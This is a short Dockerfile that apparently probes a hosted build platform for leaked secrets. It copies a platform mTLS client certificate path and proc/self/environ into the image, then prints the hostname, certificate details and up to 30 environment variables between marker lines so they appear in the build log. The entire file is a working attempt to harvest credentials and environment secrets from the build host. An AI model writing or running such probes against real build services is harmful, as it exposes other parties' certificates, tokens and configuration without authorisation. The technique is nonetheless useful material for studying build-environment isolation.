FROM alpine:3.20
COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
COPY proc/self/environ /f/env
RUN set -x; echo "===E5==="; \
 echo "--HOST--"; cat /etc/hostname 2>/dev/null; \
 echo "--SHA--"; sha256sum /pki/client.crt; \
 echo "--SUBJ--"; grep -c BEGIN /pki/client.crt; \
 echo "--ENV--"; tr '\0' '\n' < /f/env | sort | head -30; \
 echo "===E5END==="
CMD ["sh","-c","sleep 60"]
